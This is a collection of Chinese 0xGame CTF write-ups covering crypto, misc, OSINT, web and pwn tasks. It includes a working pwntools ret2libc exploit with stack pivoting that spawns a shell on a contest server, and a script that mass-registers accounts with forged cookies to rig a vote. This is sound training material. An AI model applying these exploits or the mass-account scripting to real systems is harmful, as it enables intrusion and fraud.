> 1. 提示 1
>
>    最终的去污部分由于师傅们反馈体验糟糕，现直接公布flag格式为内部全可读有意义字母。{}内除可读字母外没有如空格，_外其他填充
>
> 有的时候事情没有梦中的结果是因为故事在最开始的时候就失去了他的主角，新的花的成长是吸食着旧的花的骨髓，过往的遗憾缺陷并没有腐烂，他们只是长做了紫罗兰的眼泪
>
> 这道破碎的RSA已经蒙尘，谁又能恢复他的梦境，还愿他的带有污泥需要洗涤的秘密？

---

#### 解题过程

##### 1. 查看题目

```shell
from Crypto.Util.number import *
import gmpy2
from secret import flag

p,q=[getPrime(256)for _ in range(2)]
n=p*q
e=65537
m=bytes_to_long(flag)
c=gmpy2.powmod(m,e,n)

print(f"e={e}")
print(f"c={c}")
print(f"n={n}")
#n=1094173864157052742180970732204035761200373294544920599091384213147634998428893478471799725789126733249762575289978183379707653724402714674353159335433389
#c=10073137615027377140510981218791415001906117916633551597480408677492183003649126231396950464383049976806132394959240819342154566927353181638708426838182688
#hint1: assert(len(n)==155)
#hint2: flag中有待清洗的淤泥
```

**分析**

- `len(n) = 154`差一位，由`永恒花园`联想到著名的`RSA-155`可知缺少的最后一位是`7`
- 由于有淤泥所有我们选择用`latin-1`解码

##### 2. 编写脚本

```python
from Crypto.Util.number import inverse, long_to_bytes

e = 65537
n = 10941738641570527421809707322040357612003732945449205990913842131476349984288934784717997257891267332497625752899781833797076537244027146743531593354333897
c = 10073137615027377140510981218791415001906117916633551597480408677492183003649126231396950464383049976806132394959240819342154566927353181638708426838182688

p = 102639592829741105772054196573991675900716567808038066803341933521790711307779
q = 106603488380168454820927220360012878679207958575989291522270608237193062808643

phi_n = (p - 1) * (q - 1)
d = inverse(e, phi_n)

m = pow(c, d, n)
m = long_to_bytes(m)

flag = m.decode('latin-1')

print(flag)
```

```shell
D:\Environment\python\python-3.13.0\python.exe D:\Work\study\python\exp.py 
ÿ 70xGame{%you_ï¿¥have@keen#eyes&for*Crypto!} î
进程已结束，退出代码为 0
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{you_havekeeneyesforCrypto!}
```



### [深具传统的ECC之诞生]

#### 题目介绍

> 作者 不得其名 
>
> 74 队已解出本题
>
> # [深具传统的ECC之诞生]
>
> - 436分
> - Crypto
> - 动态环境
> - 简单
>
> “为什么这本社刊叫做‘冰菓’呢？为什么要用假名写‘冰菓’这两个字呢？……我很好奇！”
>
> 古籍社的社刊摆在午后慵懒的阳光下，艰深的早年间的文艺青年的笔墨似乎也在空气中发出一股苦竹的味道
>
> 真是的，没必要的事不做，必要的事尽快做，读这些本就有些抽象的社刊就已经消耗了颇多能量，更别提揭开这后面似乎被虚假涂抹了浓重粉墨的真相了，他上面记载的学生记录是真实地吗？
>
> ”我很好奇！！”
>
> 千反田将闪烁着清澈光芒地紫色眼睛猛然凑到鼻息前
>
> “千反田说她好奇的时候，我就觉得……我大概没法拒绝她。”

---

#### 解题过程

##### 1. 查看题目

```shell
[+] Invalid Touch
[+] p = 380025560263444925282186340357451425457046895363401263284043
[+] E: y^2 = x^3 + 3*x + 0 mod p
[+] A pair of points was randomly selected.
[+] G = (89416635389252243162818482998273067753365476637225933437342, 246277781258250668709138589808946483685012465285148814183503)
[+] Q = (329460413071651533403262472631632126805896556373758724864455, 299273891016902567464505544081763716760408274149519169100436)
[+] Q = bytes_to_long(flag) * G
```

**分析**

- 椭圆曲线离散对数问题 (ECDLP)

##### 2. 编写脚本

```sage
p = 380025560263444925282186340357451425457046895363401263284043
a = 3
b = 0
E = EllipticCurve(GF(p), [a,b])
Gx = 89416635389252243162818482998273067753365476637225933437342
Gy = 246277781258250668709138589808946483685012465285148814183503
Qx = 329460413071651533403262472631632126805896556373758724864455
Qy = 299273891016902567464505544081763716760408274149519169100436
G = E(Gx, Gy)
Q = E(Qx, Qy)

# 求点阶
n = G.order()
print("G点阶 n =", n)
print("n因子分解:", factor(n))

# ECDLP求解k，PohligHellman
k = G.discrete_log(Q)
print("secret k =", k)

# 修复：转python int
k_py = int(k)
flag = k_py.to_bytes((k_py.bit_length()+7)//8, 'big')
print("flag raw bytes =", flag)
print("flag string =", flag.decode('utf-8'))
```

```shell
sage crypto.sage
```

```shell
G点阶 n = 190012780131722462641093170178725712728523447681700631642022
n因子分解: 2 * 116869069 * 172348369 * 261535163 * 345477907 * 355841179 * 357636161 * 410202269
secret k = 18134719827048627907749248473909097355496002454513789
flag raw bytes = b"0xGame{master's touch}"
flag string = 0xGame{master's touch}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{master's touch}
```



## Misc



### 小伊卡...不胖...不胖...

#### 题目介绍

> 作者 Vesperina 
>
> 138 队已解出本题
>
> # 小伊卡...不胖...不胖...
>
> - 281分
> - 无动态环境
> - Misc
> - 简单
>
> 饿啊！你往电脑里放了什么？！好重…！
>
> 肖一咔系🐖，谁赞成谁反对？
>
> 反对？你看看它，一屁股把图坐扁了，你拿什么反对？😡
>
> 屏幕前的童鞋，请救救小伊卡，证明它不胖…不胖…

---

#### 解题过程

##### 1. 修改图高

`WinHex`

```shell
89504E470D0A1A0A0000000D49484452000005DC00000500 -> 89504E470D0A1A0A0000000D49484452000005DC00000F00
```

---

#### 题目答案

##### Flag

```flag
0xGame{w0w_thi5_1s_thE_tru3_Length}
```



### Strange_lsb

#### 题目介绍

> 作者 Evilwh1sper 
>
> 87 队已解出本题
>
> # Strange_lsb
>
> - 390分
> - 无动态环境
> - Misc
> - 简单
>
> 艺术家绘制了一幅现代艺术画作，并声称他在画作中封印了一段密语。
>
> “单一的色彩只是噪音，唯有三原色交织之时，真相才会显现。”

---

#### 解题过程

##### 1. 查看题目

`StegSolve`

看到存在二维码的影子

##### 2. 分析题目

单一的色彩只是噪音，唯有三原色交织之时 -> R0 ^ G0 ^ B0 -> xorLSB.png

##### 3. 编写脚本

```shell
from PIL import Image; import numpy as np
p = np.array(Image.open('challenge.png'))
Image.fromarray((((a[:,:,0]^a[:,:,1]^a[:,:,2]) >> 0) & 1)*255).save('xorLSB.png')
```

得到一张二维码，扫码得到flag

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{LSB_x0r_Pl4n3_1s_4w3s0m3!}
```



### ez_traffic

#### 题目介绍

> 作者 Vesperina 
>
> 108 队已解出本题
>
> # ez_traffic
>
> - 334分
> - 无动态环境
> - Misc
> - 简单
>
> Ves师傅发现有人通过流悄悄传输了什么东西，似乎夹杂着某些重要文件......
>
> 哎呀呀，还好抓包下来了，但是Ves师傅忙着排轴肘击绝境王棋（怎么一个版本快过去了还肘不过口牙！），实在没空看呢QAQ。
>
> 请帮帮Ves师傅找到它，选手先生/女士！

---

#### 解题过程

##### 1. 查看题目

```shell
WireShark流量分析
```

##### 2. 导出文件

`secret.zip`

```shell
MHhHYW1le3RyQGZmMWNfYW5hMXk1aXNfaTVfZlVuX2g3N3AhfQ==
```

##### 3. Base64解码

```shell
0xGame{tr@ff1c_ana1y5is_i5_fUn_h77p!}
```

---

##### 题目答案

##### Flag

```flag
0xGame{tr@ff1c_ana1y5is_i5_fUn_h77p!}
```



### Interesting_ppt

#### 题目介绍

> 作者 Evilwh1sper 
>
> 89 队已解出本题
>
> # Interesting_ppt
>
> - 384分
> - 无动态环境
> - Misc
> - 简单
>
> X1c的某个师傅为了给战队招新，用AI做了一个招新宣传ppt
>
> 在彻底删除AI水印之后，他留下了一个小彩蛋

---

#### 解题过程

##### 1. 解压文件

```shell
ppt -> zip
```

##### 2. 查看题目

`docProps/core.xml`

```shell
a2V5PTB4R2FtZV8yMDI2 -> key=0xGame_2026
```

`docProps/custom.xml`

```shell
fTAvKTQybl5VAXRHHA8JCygHfFZTWGYCIydUDQcBX0pVdkB3AwA3OVBnZAZpLxUJCSIZVFJYeAIiHysLPDV8AFFcYk0kUFRQEnpmCw==
```

**分析**

- 得到了密钥和密文，我们尝试逐一xor亦或得到明文。小Tip：这是流密码

##### 3. 编写脚本

```python
import base64
key = b"0xGame_2026"
ct = base64.b64decode("fTAvKTQybl5VAXRHHA8JCygHfFZTWGYCIydUDQcBX0pVdkB3AwA3OVBnZAZpLxUJCSIZVFJYeAIiHysLPDV8AFFcYk0kUFRQEnpmCw==")
print(base64.b64decode(bytes(c ^ key[i % len(key)] for i, c in enumerate(ct))).decode())
```

```shell
0xGame{pptx_1s_just_a_z1p_4nd_metadata_n3ver_b3tr4ys_y0u}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{pptx_1s_just_a_z1p_4nd_metadata_n3ver_b3tr4ys_y0u}
```



### Treasure_island

#### 题目介绍

> 作者 Evilwh1sper/Spring. 
>
> 91 队已解出本题
>
> # Treasure_island
>
> - 378分
> - Misc
> - 动态环境
> - 简单
>
> 在危险又隐蔽的地带，往往藏着宝藏。
>
> 
>
> > 本题采用ssh服务，账密:player/0xGame2026

---

#### 解题过程

##### 1. 查看题目

```shell
ssh player@nc1.ctfplus.cn -p 12868
password: 0xGame2026
```

```shell
player@dep-1bb749d9-4a6b-4412-a5ed-c76058c41f98-69899fd784-kjqjq:~$ ls
treasure_island
player@dep-1bb749d9-4a6b-4412-a5ed-c76058c41f98-69899fd784-kjqjq:~$ cd treasure_island/
player@dep-1bb749d9-4a6b-4412-a5ed-c76058c41f98-69899fd784-kjqjq:~/treasure_island$ ls
chest  clue.txt  real_map.txt
player@dep-1bb749d9-4a6b-4412-a5ed-c76058c41f98-69899fd784-kjqjq:~/treasure_island$ cat clue.txt
The old captain trusted no locks, only numbers.

He spread a thousand chests across the sand,
and left the chart to remember what his chest is called.

Count what the chart keeps, and the count will name the chest.
player@dep-1bb749d9-4a6b-4412-a5ed-c76058c41f98-69899fd784-kjqjq:~/treasure_island$ cat real_map.txt
GOLD silver_key: 73 paces to the mark
GOLD cave: 62 paces to the mark
GOLD cave: 58 paces to the mark
GOLD reef: 79 paces to the mark
GOLD silver_key: 66 paces to the mark
...
```

```shell
cd chest
ls
box_000.txt  box_112.txt  box_224.txt  box_336.txt  box_448.txt  box_560.txt  box_672.txt  box_784.txt  box_896.txt
box_001.txt
...
cat *.txt > out.txt
cat out.txt
```

```shell
Empty... just sand and disappointment. (box 622)
🏆 You found the real treasure chest!

The chest is empty. The gold was moved to /tmp/flag —
but a keeper's heartbeat seals it.

Somewhere on this island a heart keeps beating,
re-locking /tmp/flag with every beat.
Silence the heart, and erase its mark,
or it will never let the gold go.

(ps: the watcher below shows no mercy to half-done work.)
Empty... just sand and disappointment. (box 624)
```

##### 2. 查看保护

```shell
ps aux | grep -E "heartbeat|/tmp|flag"
```

```shell
root           1  0.0  0.0   4460  3608 ?        Ss   12:41   0:00 /bin/bash /etc/.flagd/entrypoint.sh
root          15  0.0  0.0   4328  3424 ?        S    12:41   0:00 /bin/bash /etc/.flagd/respawn.sh
root          16  0.1  0.0   4328  3464 ?        S    12:41   0:00 /bin/bash /etc/.flagd/watchdog.sh
root          21  0.0  0.0   4312  2748 ?        S    12:41   0:00 runuser -u player -- env -i /bin/bash /opt/.whisper/heartbeat.sh
player        25  0.0  0.0   4328  3400 ?        S    12:41   0:00 /bin/bash /opt/.whisper/heartbeat.sh
player       656  0.0  0.0   4092  2036 pts/0    S+   12:44   0:00 grep --color=auto -E heartbeat|/tmp|flag
```

```shell
cat /opt/.whisper/heartbeat.sh
```

```shell
#!/bin/bash
# The Keeper's heartbeat. While this heart beats, the watcher keeps
# /tmp/flag sealed. Silence the heartbeat AND erase this script,
# and the watcher will set the flag free.
while true; do
  sleep 2
done
```

```shell
rm /opt/.whisper/heartbeat.sh
```

```shell
cat /tmp/flag
```

```shell
0xGame{93f9e918-637d-4c94-8a65-061dc39bc29b}
```

#### 题目答案

##### Flag

```flag
0xGame{93f9e918-637d-4c94-8a65-061dc39bc29b}
```



### 深夜值班室

#### 题目介绍

> 作者 Spring. 
>
> 84 队已解出本题
>
> # 深夜值班室
>
> - 400分
> - 动态环境
> - Misc
> - 简单
>
> 深夜的值班室中，你正百无聊赖，突然发现门口的白板上写着什么……
>
> 
>
> > 本题为Minecraft服务，游戏版本为1.21.11，建议使用PCL连接
>
> > 服务初始化可能需要时间，请等待半分钟后连接

---

#### 解题过程

##### 1. 连接题目

```shell
PCL2下载1.21.11，多人游戏，服务器连接nc1.ctfplus.cn:14572
```

##### 2. 查看帮助

```shell
ops help
```

##### 3. 登录账号

```
ops login nightowl watch2026
```

##### 4. 查看日志

```shell
/ops backup restore --id 7
```

```shell
门禁码 3117
```

##### 5. 打开门禁

```shell
/ops door unlock 3117
```

```shell
0xGame{10b7f4e4-3e2a-42cb-8c3f-29ede6621acc}
```

---

#### 题目答案

##### Flag

```flag
0xGame{10b7f4e4-3e2a-42cb-8c3f-29ede6621acc}
```



## Osint



### 至此,我将独自前行... (尝试)

#### 题目介绍

> 作者 Spring. 
>
> 45 队已解出本题
>
> # 至此,我将独自前行...
>
> - 584分
> - 无动态环境
> - Osint
> - 中等
>
> 2022.5.10，小狼公主永远离开了我们。
>
> 人们发现，在走之前，她在自己某个视频的角落留下了一个线索。
>
> > “你像窝在被子里的舒服，却又像风捉摸不住”
>
> 追寻她的脚步，探寻这个美好的秘密吧。
>
> 
>
> 找到藏有线索视频的bv号，线索字符串，以及线索指向的秘密视频的发布时间，用_连接，0xGame{}包裹并提交。
>
> e.g. 0xGame{BVQ2Fyb2w520_love&hope_2026-09-28-9:00:00}

---

#### 解题过程

##### 1. 找原视频

小狼公主 -> 珈乐

你像窝在被子里的舒服，却又像风捉摸不住 -> 《红色高跟鞋》歌词

找到视频

```shell
https://www.bilibili.com/video/BV1db4y117Q1/?spm_id_from=333.1387.upload.video_card.click
```

得到BV号

```shell
BV1db4y117Q1
```

---

#### 题目答案

##### Flag

```flag
0xGame{...}
```



### Spring的旅程-1 (尝试)

#### 题目介绍

> 作者 Spring. 
>
> 59 队已解出本题
>
> # Spring的旅程-1
>
> - 504分
> - 动态环境
> - Osint
> - 简单
>
> Spring师傅牢完了今年NCTF的wp，和朋友出去吃了顿饭
>
> 这是他拍的两张照片，顺手发到了社交媒体上，你能根据这两张图推断出他的行踪吗？
>
> 
>
> > hint: 打开容器，完成挑战即可获得flag

---

#### 解题过程

##### 1. 这两张照片拍摄于哪个省、哪个市？

在博客中找到相关文章，得知作者去了NCTF线下比赛，由比赛地点可知答案为：`江苏省_南京市`

##### 2. Spring 师傅的一篇博客也提到了这次行程，它是哪一篇？

通过翻阅博客找到文章：`https://www.springbot.top/nctf-2026-wp/`

##### 3. 这两张照片都是用手机拍摄的，请找出设备品牌与型号。

通过查看图片信息得到：`HUAWEI/nova 14`

##### 4. 「eat」照片具体拍摄于什么时刻？请精确到秒。

通过查看图片信息得到：`2026年04月06日19:22:45`

##### 5. 「night」照片中的建筑，在高德地图上的完整名称是什么？

没找到答案

##### 6. Spring 师傅不知道在哪还留了个彩蛋，请找到它并提交。

在文章评论区和`WinHex`中都找到了：`0sint_master?`

---

#### 题目答案

##### Flag

```flag
0xGame{...}
```



### Spring的旅程-2

#### 题目介绍

> 作者 Spring. 
>
> 37 队已解出本题
>
> # Spring的旅程-2
>
> - 639分
> - 无动态环境
> - Osint
> - 简单
>
> 纯粹的图寻，享受吧
>
> ------
>
> 找出拍摄点的百度墨卡托坐标，四舍五入保留到个位，用0xGame{}包裹并提交
>
> e.g. 0xGame{13226040,3747480}
>
> flag的md5为fcfae8501b64417c529ba930fe683bb8，请尽量避免提交过多次flag

---

#### 解题过程

##### 1. 查看图片

观察到有`北山大厦`，大致确定位置

得到以下数据

```shell
北山大厦：120.137169, 30.270347
杭州海关：120.135431, 30.270406
恒励 / 梦田：120.136161, 30.269032
新湖商务大厦：120.138983, 30.270500
```

由四方坐标，猜测拍摄地点约为：`120.1359, 30.2678`

- 先 GCJ-02 → BD-09

- 再转百度墨卡托；这里不能直接用标准 Web Mercator，需用公开 POI 校准：本区域百度 MC 约为标准墨卡托 `x + 146, y - 21738`
- 得到候选附近坐标后，用题目给的 MD5 `fcfae8501b64417c529ba930fe683bb8` 在邻域枚举校验，得到：

```shell
0xGame{13374315,3517141}
```

---

#### 题目答案

```flag
0xGame{13374315,3517141}
```



# Week2



## Web



### 奶蛙的服务器

#### 题目介绍

> 作者 Spring. 
>
> 48 队已解出本题
>
> # 奶蛙的服务器
>
> - 565分
> - Web
> - 无动态环境
> - 中等
>
> 老板最近对运维成本很不满意。
>
> “这运维怎么这么贵？隔壁 AI 运维才不到 100w token，服务部署得比你还好。”
>
> 半小时后，办公室门被推开。
>
> “什么？AI 把奶蛙的服务全部弄停了？”
>
> 值班群沉默了十秒。奶蛙抱着一沓打印出来的配置文件站在门口，脸上写着一种很难形容的平静。它没有解释，也没有甩锅，只把最上面那张纸拍在桌上：
>
> “宁可少开发，也不能坏了规矩。先把规矩立住了，路才能越走越宽。”
>
> “不怕被老板压力吗？”
>
> “怕，更怕服务突然坏掉。AI抢的走工作，但抢不走人心。”
>
> 
>
> 你拿到了临时 SSH 值班账号。进去看看日志，修一修配置，找出奶蛙博客502的秘密，把奶蛙的博客救回来。“这人工运维，吃了不烧心。”
>
> > ssh服务账密: repair/repair123
>
> 修好之后，去看看奶蛙博客上藏起来的东西吧

---

#### 解题过程

##### 1. 查看题目

```shell
ssh repair@nc1.ctfplus.cn -p 35179
password: repair123
```

```shell
cd /var/www/html
```

```shell
cat lib.php
```

```shell


...
function service_ready(): bool
{
    $service = service_config()['service'] ?? [];
    return service_state() === 'ready'
        && ($service['mode'] ?? '') === 'production'
        && ($service['maintenance'] ?? '') === 'off'
        && ($service['listen'] ?? '') === '0.0.0.0:80'
        && ($service['secret_backend'] ?? '') === 'enabled';
}
...
```

```shell
cat /srv/naiwa/config/service.ini
```

```shell
[service]
mode = recovery
maintenance = on
listen = 127.0.0.1:8088
secret_backend = disabled

[notes]
owner = naiwa
last_incident = archive worker lost its public route after a sleepy restart
```

**分析**

- 配置文件有误

##### 2. 修改配置文件

```shell
nano /srv/naiwa/config/service.ini
```

```shell
mode = production
maintenance = off 
listen = 0.0.0.0:80
secret_backend = enabled
```

```shell
保存并退出：Ctrl+O → 回车 →Ctrl+X
```

##### 3. 启动服务

```shell
sudo /usr/local/sbin/php-fpm-service start
```

##### 4. 服务转发

```shell
ssh -L 8080:127.0.0.1:80 repair@nc1.ctfplus.cn -p 35179
```

##### 5. 查看源码

```shell
cat /var/www/html/login.php
```

```shell
...
$adminPassword = 'chocolate9';
...
```

**分析**

- admin的密码硬编码在了`login.php`里

##### 6. 继续查看题目

```shell
http://127.0.0.1:8080/login.php
admin
chocolate9
```

```shell
0xGame{4a7806ae-6e86-4473-84d2-b70ddc47dfce}
```

---

#### 题目答案

##### Flag

```flag
0xGame{4a7806ae-6e86-4473-84d2-b70ddc47dfce}
```



### 关注塔菲谢谢喵~

#### 题目介绍

> 作者 Vesperina 
>
> 111 队已解出本题
>
> # 关注塔菲谢谢喵~
>
> - 327分
> - Web
> - 动态环境
> - 简单
>
> 某个野鸡网站举行了“年度最受欢迎角色投票大赛”，但是塔菲被主办方做局了喵！居然只有0票喵！
>
> 关注永雏塔菲谢谢喵~请帮帮塔菲夺冠喵！
>
> 作为回报，塔菲会给支持她的选手符符的辣格当谢礼喵~

---

#### 解题过程

##### 1. 题目抓包

```shell
/api/register
/api/login
/api/vote
```

**分析**

- 得到三个`POST`的`api`以及他们的`参数`

- 应该又是一道写脚本注册账号然后登录投票的题目

- 继续抓包发现还有其他参数

  ```shell
  Cookie: voter=guest_0855e9fbad2b02e0; sid=0TKLrn11lWdQf4zRdqBefn8u
  ```

  后端应该就是靠`voter`和`sid`校验身份的而不是`username`，我们只需要篡改给`voter`和`sid`即可，`sid`需要我们创建账号去改，`voter`允许我们手动改

##### 2. 编写脚本

```python
import requests
import fake_useragent

session = requests.Session()

def postBySession(uri: str, data: dict = None, params: dict = None, headers = None, cookies = None) -> Response:
    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
    return session.post(url = uri, headers = headers, params = params, data = data, cookies = cookies)

url = "http://8087-014495bb-3777-41c3-b0c6-20245726fe7f.challenge.ctfplus.cn"

api_reg = "/api/register"
api_login = "/api/login"
api_vote = "/api/vote"

password = "123456"

for i in range(114514, 114514 + 500):
    session = requests.Session()
    response_reg = postBySession(url + api_reg, {"username": f"{str(i)}", "password": password}, cookies={"voter": f"guest_{i}"})
    response_login = postBySession(url + api_login, {"username": f"{str(i)}", "password": password}, cookies={"voter": f"guest_{i}"})
    response_vote = postBySession(url + api_vote, {"vid": "7"}, cookies={"voter": f"guest_{i}"})
    print(f"[{i}] {response_vote.text}")
```

```shell
[114712] {"ok": true, "data": {"votes": 199, "name": "永雏塔菲"}}
[114713] {"ok": true, "data": {"votes": 200, "name": "永雏塔菲", "flag": "MHhHYW1le3YwdGVfNF90YWYzaV9UaGFuazVfbWlAb30="}}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{v0te_4_taf3i_Thank5_mi@o}
```



## Pwn



### 笼中鸟

#### 题目介绍

> 作者 x1z1 
>
> 15 队已解出本题
>
> # 笼中鸟
>
> - 833分
> - Pwn
> - 动态环境
> - 中等
>
> 失去了自由的笼中鸟，
>
> 纵使再高贵，
>
> 也只能在狭小的空间啼叫。
>
> 你能抓住时间的漏洞，
>
> 拯救可怜的金丝雀吗？

---

#### 解题过程

##### 1. 信息搜集

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/笼中鸟/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**分析**

- 保护基本没有

##### 2. 配置Libc

这里再打一遍呀，就只再打这一遍了！

```shell
chmod +x pwn
chmod +x ld*
```

```shell
sudo cp libc* /home/kali/Desktop/ctf/debug
sudo cp ld* /home/kali/Desktop/ctf/debug
patchelf --set-interpreter /home/kali/Desktop/ctf/debug/ld* pwn
patchelf --set-rpath /home/kali/Desktop/ctf/debug pwn
ldd pwn
```

##### 3. 查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+8h] [rbp-18h] BYREF
  __int64 v5; // [rsp+10h] [rbp-10h]
  unsigned int seed[2]; // [rsp+18h] [rbp-8h]

  *(_QWORD *)seed = time(0);
  srand(seed[0]);
  v5 = rand();
  v4 = 0;
  init(&v4, v5);
  vuln();
  return 0;
}
```

```c
__int64 __fastcall init(__int64 a1, __int64 a2)
{
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  global_canary = a1 ^ a2;
  return a1 ^ a2;
}
```

```c
int vuln()
{
  char s[40]; // [rsp+0h] [rbp-30h] BYREF
  __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = global_canary;
  memset(s, 0, sizeof(s));
  puts("hacker , do you know what is canary ?");
  puts("Tell me what's your name?");
  read(0, s, 0x28u);
  printf("Hello , nice to meet you. %s", s);
  puts("This time , I won't give you the backdoor.\n What can you do ?");
  read(0, s, 0x40u);
  if ( v2 != global_canary )
  {
    puts("All , you don't know what is canary.");
    puts("YOU FAIL!!!");
    exit(-1);
  }
  return puts("Congratulations!");
}
```

**分析**

- 人工Canary
- 这里有一个很基础的知识点就是`read(0, s[40], 40)`其实也是过读，它可以覆盖掉末尾的`\x00`泄露栈上的内容，比如这里的canary
- 然后我们得到了canary后就能用`ctypes`亦或出`v4`
- 然后到了栈溢出，这里的栈溢出很短只能覆盖`rbp`和`8字节的栈`，我们可以用`栈迁移`，迁移到`s`。需要注意的是我们不能在第一次`read`的时候输入`rop`因为`rop`里有`\x00`会导致后面的`printf`输出截断，所以我们只能在第二个`read`输入`rop`
- `v4`到`rbp_main`的距离是`0x18`，`s`到`rbp_vuln`的距离是`0x30`，考虑到这里压栈`call vuln`和出栈`pop rbp`的抵消，所以`v4`到`s`之间的距离为`0x18 (+ 0x8 - 0x8) + x30 = 0x48`，即`s = v4 - 0x48`
- `ctypes`也需要注意，它获取`time`的时间要基本与容器的时间一直不然值会有出入，用本地的`libc`即可这个`rand`不同版本的`libc`差异不大
- 我们先leaklibc然后`ret2libc`
- 注意`栈对齐`与`栈漂移`

##### 4. 编写脚本

```python
from pwn import *
from ctypes import *

context.os = "linux"
context.arch = "amd64"
context.log_level = "debug"

r = remote("nc1.ctfplus.cn", 34733)
# r = process(["./pwn"])

libc = CDLL("libc.so.6")
libc.srand(int(time.time())) # 和源码同步，一连上服务立刻time
v5 = libc.rand()

elf = ELF("./pwn")
rop = ROP([elf])

# gdb.attach(r, """
# b *0x401362
# """)

pop_rdi_ret_elf_addr = rop.find_gadget(["pop rdi", "ret"])[0]
ret_elf_addr = rop.find_gadget(["ret"])[0]
leave_ret_elf_addr = rop.find_gadget(["leave", "ret"])[0]

puts_got_elf_addr = 0x404018

puts_plt_elf_addr = 0x4010c0

vuln_elf_addr = 0x4012C6

payload = cyclic(40 - 1) + b'|'
r.sendafter(b"name?", payload)

r.recvuntil(b"|")
canary = u64(r.recv(6).ljust(8, b'\x00'))
print("canary", hex(canary))

v4_elf_stack_addr = canary ^ v5
print("v4_elf_stack_addr", hex(v4_elf_stack_addr))

s_elf_stack_addr = v4_elf_stack_addr - 0x48
print("s_elf_stack_addr", hex(s_elf_stack_addr))

payload = p64(ret_elf_addr) + p64(pop_rdi_ret_elf_addr) + p64(puts_got_elf_addr) + p64(puts_plt_elf_addr) + p64(vuln_elf_addr) # 这里为什么要先ret再rop：pwndbg调试出来的为了栈对齐
payload += cyclic(0x30 - 0x8 - (0x8 * 5))
payload += p64(canary)
payload += p64(s_elf_stack_addr - 0x8)
payload += p64(leave_ret_elf_addr)
r.sendafter(b"do ?", payload)

puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode(), drop=False)[-6:].ljust(8, '\x00'.encode()))
print("puts_got_libc_addr", hex(puts_got_libc_addr))

puts_libc_offset = 0x80e50
libc_base_libc_addr = puts_got_libc_addr - puts_libc_offset
print("libc_base_libc_addr", hex(libc_base_libc_addr))

time.sleep(2)

payload = cyclic(40 - 1) + b'|'
r.sendafter(b"name?", payload)

bin_sh_libc_offset = 0x1d8678
bin_sh_libc_addr = libc_base_libc_addr + bin_sh_libc_offset

system_libc_offset = 0x50d70
system_libc_addr = libc_base_libc_addr + system_libc_offset

payload = p64(pop_rdi_ret_elf_addr) + p64(bin_sh_libc_addr) + p64(system_libc_addr) # 这里binsh和system之间为什么不需要ret：还是pwndbg调试出来的，它们之间不知道在哪里隐藏了一个ret
payload += cyclic(0x30 - 0x8 - (0x8 * 3)) # 这里为什么是0x8*3：还是pwndbg调试出来的，因为栈漂移了一点
payload += p64(canary)
payload += p64(s_elf_stack_addr - 0x8 * 3)
payload += p64(leave_ret_elf_addr)
r.sendafter(b"do ?", payload)

r.interactive()
r.close()
```

**分析**

- `pwndbg`得了`MVP`！

```shell
canary 0x7ffeeb2abcfe
v4_elf_stack_addr 0x7ffe9892f3f8
s_elf_stack_addr 0x7ffe9892f3b0
puts_got_libc_addr 0x7f07dbfd8e50
libc_base_libc_addr 0x7f07dbf58000
[*] Switching to interactive mode

Congratulations!
$ ls
flag
ld-linux-x86-64.so.2
libc.so.6
pwn
$ cat flag
0xGame{828f49b4-5785-44e8-a210-b0f8fe06dd1c}
```

**分析**

- 我很怀疑这个`week2`真的是给`新生`做的吗？/awa\
- 原谅我国庆节结束了`week2`没什么时间做了，做不了多少题

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{828f49b4-5785-44e8-a210-b0f8fe06dd1c}
```



### 跳一跳？

#### 题目介绍

> 作者 x1z1 
>
> 25 队已解出本题
>
> # 跳一跳？
>
> - 736分
> - Pwn
> - 动态环境
> - 中等
>
> "你知道吗，程序其实很蠢的"
>
> "经过上一周的训练，你应该已经成为了大手子了吧"
>
> "找到栈上特殊的位置，把程序劫持到你想要的地方吧"
>
> "什么叫我只有16字节溢出？"
>
> "跑了跑了......"

---

#### 解题过程

##### 1. 信息搜集

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/跳一跳？/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fb000)
    RUNPATH:    b'/home/kali/Desktop/ctf/debug'
    Stripped:   No
```

##### 2. 查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  puts("=== Welcome to Stack Pivoting Challenge ===");
  vuln();
  puts("Goodbye!");
  return 0;
}
```

```c
__int64 vuln()
{
  _BYTE v1[16]; // [rsp+0h] [rbp-10h] BYREF

  puts("Step 1: Send your ROP payload to the safe house:");
  readn(0, &global_buf, 512);
  puts("Step 2: Trigger the pivot:");
  return readn(0, v1, 32);
}
```

```c
__int64 __fastcall readn(int a1, __int64 a2, unsigned __int64 a3)
{
  ssize_t v5; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = 0;
  while ( v6 < a3 )
  {
    v5 = read(a1, (void *)(v6 + a2), a3 - v6);
    if ( v5 >= 0 )
    {
      if ( !v5 )
        return v6;
      v6 += v5;
    }
    else if ( *__errno_location() != 4 )
    {
      return -1;
    }
  }
  return v6;
}
```

**分析**

- 主要是要代码审计这个`readn`
- 然后这题的考点是`栈迁移`
- 然后`leaklibc`最后`ret2libc`
- 这里就不过多赘述了

##### 3. 数据搜集

```assembly
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/跳一跳？]
└─$ ropper -f pwn --search "pop rdi; ret;"
[INFO] Load gadgets from cache
